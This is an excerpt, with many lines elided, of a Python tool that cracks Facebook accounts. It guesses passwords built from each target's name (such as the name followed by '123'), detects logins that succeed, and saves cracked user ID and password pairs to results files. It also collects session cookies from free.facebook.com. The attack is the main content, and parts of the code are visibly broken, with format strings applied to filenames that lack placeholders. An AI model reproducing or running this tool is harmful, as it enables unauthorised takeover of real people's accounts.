...
def login():
	...
	try:
		...
		print(" "+N+"\n [!] Diusahkan saat mengambil Cookies gunakan: \n    free.facebook.com")
...
def menu():
	...
	if ask =="":
		...
		if ask =="":
			...
			try:
				totalok = open("results/ok%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results OK Date : %s-%s-%s Total : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/ok%s.txt"%(ha, op, ta))
				exit(" "+N+"[#]------------------------------------------") 
			except (IOError):
				exit(" "+N+"[!] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/cp%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results CP Date : %s-%s-%s Total : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/cp%s.txt"%(ha, op, ta))
				exit(" "+N+"[#]------------------------------------------") 
			except (IOError):
...
def public():
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"[+] OK Saved : results/ok.txt"% (ha, op, ta))
	print(" "+N+"[+] CP Saved : results/cp.txt\n"% (ha, op, ta))
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Starting %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		...
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				...
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					...
					ok.append(uid+'|'+pw)
					save = open('results/ok.txt' % (ha, op, ta),'a') 
					...
					cp.append(uid+'|'+pw)
					save = open('results/cp.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
...
def followers():
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"[+] OK Saved : results/ok%s.txt"% (ha, op, ta))
	print(" "+N+"[+] CP Saved : results/cp%s.txt\n"% (ha, op, ta))
	print(" "+N+"-----------------------------------------------")
